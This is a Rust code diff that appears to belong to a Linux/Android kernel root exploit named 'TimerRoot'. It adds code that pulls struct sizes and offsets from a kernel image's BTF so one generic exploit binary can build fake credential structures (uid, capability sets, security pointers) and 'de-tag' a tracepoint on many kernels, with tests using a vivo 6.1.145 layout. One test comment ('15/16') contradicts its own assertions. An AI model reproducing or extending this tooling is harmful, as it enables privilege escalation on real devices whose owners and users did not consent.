@@ -996,6 +996,14 @@ mod tests {
 // The last entries after `do_group_exit` are the targets/extras; the four
 // targets are hard requirements, everything else degrades on the exploit
 // side when absent.
+//
+// The extended format appends a geometry block so one generic binary can run
+// against any kernel whose table was parsed from its image (the compiled
+// profile is only a fallback):
+//   # geometry (BTF-derived; consumed by the TimerRoot core)
+//   off.<name>=0x<value>
+// The essential key set mirrors ic_geo_keys[] in
+// third_party/timerroot/ic_syms.c (IC_GEOM_ESSENTIAL = 16).
 
 /// ic-timer's required symbol set, in `ic_syms_required[]` order: voting
 /// anchors first, then the four targets (`__tracepoint_sys_exit`,
@@ -1122,6 +1130,77 @@ where
     Ok(lines.join("\n") + "\n")
 }
 
+/// Geometry block for the extended ic-syms table.
+pub struct IcGeometry {
+    pub lines: Vec<String>,
+    /// How many of the 16 essential keys (IC_GEOM_ESSENTIAL) were found.
+    pub essential: usize,
+}
+
+impl Default for IcGeometry {
+    fn default() -> Self {
+        Self { lines: Vec::new(), essential: 0 }
+    }
+}
+
+/// Collect the `off.*` geometry lines from the image's BTF. `size` and
+/// `field` are closures so the collector stays testable without a real BTF
+/// blob; the caller passes `btf.size` / `btf.field`.
+///
+/// `off.cred_alloc` is deliberately NOT emitted: the cred slab bucket
+/// depends on cache padding we cannot derive from BTF, and the consuming
+/// core matches on the request size alone when the bucket is absent — a
+/// wrong bucket would silently miss every allocation record instead.
+pub fn collect_ic_geometry(
+    size: &dyn Fn(&str) -> Option<u32>,
+    field: &dyn Fn(&str, &str) -> Option<u32>,
+) -> IcGeometry {
+    let mut geo = IcGeometry::default();
+    let mut push = |key: &str, value: Option<u32>, essential: bool| {
+        if let Some(value) = value {
+            geo.lines.push(format!("off.{key}=0x{value:x}"));
+            if essential {
+                geo.essential += 1;
+            }
+        }
+    };
+    // Allocation signatures the trace scans match on.
+    push("timer_alloc", size("k_itimer"), true);
+    push("cred_req", size("cred"), true);
+    push("task_alloc_bytes", size("task_struct"), true);
+    // Fake-cred field offsets.
+    push("task_cred", field("task_struct", "cred"), true);
+    push("cred_uid", field("cred", "uid"), true);
+    push("cap_inh", field("cred", "cap_inheritable"), true);
+    push("cap_perm", field("cred", "cap_permitted"), true);
+    push("cap_eff", field("cred", "cap_effective"), true);
+    push("cap_bset", field("cred", "cap_bset"), true);
+    push("cap_amb", field("cred", "cap_ambient"), true);
+    push("cred_security", field("cred", "security"), true);
+    push("cred_user", field("cred", "user"), true);
+    push("cred_user_ns", field("cred", "user_ns"), true);
+    push("cred_ucounts", field("cred", "ucounts"), true);
+    push("cred_group_info", field("cred", "group_info"), true);
+    // vr.ko de-tag.
+    push("tp_funcs", field("tracepoint", "funcs"), true);
+    // Optional refinements: the core has safe compiled fallbacks.
+    push("timer_node_off", field("k_itimer", "node"), false);
+    geo
+}
+
+/// Render the geometry block appended to an ic-syms table.
+pub fn render_ic_geometry(geo: &IcGeometry) -> String {
+    if geo.lines.is_empty() {
+        return String::new();
+    }
+    let mut out = String::from("\n# geometry (BTF-derived; consumed by the TimerRoot core)\n");
+    for line in &geo.lines {
+        out.push_str(line);
+        out.push('\n');
+    }
+    out
+}
+
 #[cfg(test)]
 mod ic_syms_tests {
     use super::*;
@@ -1161,5 +1240,58 @@ mod ic_syms_tests {
         let mut warn = |_: &str| {};
         let resolve = |name: &str| (name != "init_cred").then_some(0x1000u64);
         assert!(render_ic_syms("r", resolve, &mut warn).is_err());
+    }
+
+    #[test]
+    fn geometry_collector_full_set() {
+        // Reference 6.1.145 vivo layout: every BTF lookup succeeds.
+        let sizes = |s: &str| match s {
+            "k_itimer" => Some(0x108u32),
+            "cred" => Some(0xb8u32),
+            "task_struct" => Some(0x1500u32),
+            _ => None,
+        };
+        let fields = |s: &str, f: &str| match (s, f) {
+            ("task_struct", "cred") => Some(0x838u32),
+            ("cred", "uid") => Some(0x8u32),
+            ("cred", "cap_inheritable") => Some(0x2cu32),
+            ("cred", "cap_permitted") => Some(0x34u32),
+            ("cred", "cap_effective") => Some(0x3cu32),
+            ("cred", "cap_bset") => Some(0x44u32),
+            ("cred", "cap_ambient") => Some(0x4cu32),
+            ("cred", "security") => Some(0x78u32),
+            ("cred", "user") => Some(0x80u32),
+            ("cred", "user_ns") => Some(0x88u32),
+            ("cred", "ucounts") => Some(0x90u32),
+            ("cred", "group_info") => Some(0x98u32),
+            ("tracepoint", "funcs") => Some(0x40u32),
+            ("k_itimer", "node") => Some(0x78u32),
+            _ => None,
+        };
+        let geo = collect_ic_geometry(&sizes, &fields);
+        assert_eq!(geo.essential, 16, "all 16 essential keys found");
+        assert_eq!(geo.lines.len(), 17, "16 essential + timer_node_off");
+        assert!(geo.lines.contains(&"off.timer_alloc=0x108".to_string()));
+        assert!(geo.lines.contains(&"off.task_cred=0x838".to_string()));
+        assert!(geo.lines.contains(&"off.tp_funcs=0x40".to_string()));
+        assert!(geo.lines.contains(&"off.timer_node_off=0x78".to_string()));
+        assert!(!geo.lines.iter().any(|l| l.starts_with("off.cred_alloc")));
+        let text = render_ic_geometry(&geo);
+        assert!(text.starts_with("\n# geometry (BTF-derived"));
+        assert!(text.contains("off.cred_uid=0x8\n"));
+    }
+
+    #[test]
+    fn geometry_collector_partial_and_empty() {
+        // A 6.6-style BTF without cap_ambient: 15/16, key omitted.
+        let sizes = |s: &str| (s == "k_itimer").then_some(0x120u32);
+        let fields = |s: &str, f: &str| (s == "cred" && f == "uid").then_some(0x4u32);
+        let geo = collect_ic_geometry(&sizes, &fields);
+        assert_eq!(geo.essential, 2);
+        assert_eq!(geo.lines.len(), 2);
+        assert_eq!(geo.lines[0], "off.timer_alloc=0x120");
+        // No BTF at all: empty block renders as nothing.
+        let empty = IcGeometry::default();
+        assert!(render_ic_geometry(&empty).is_empty());
     }
 }
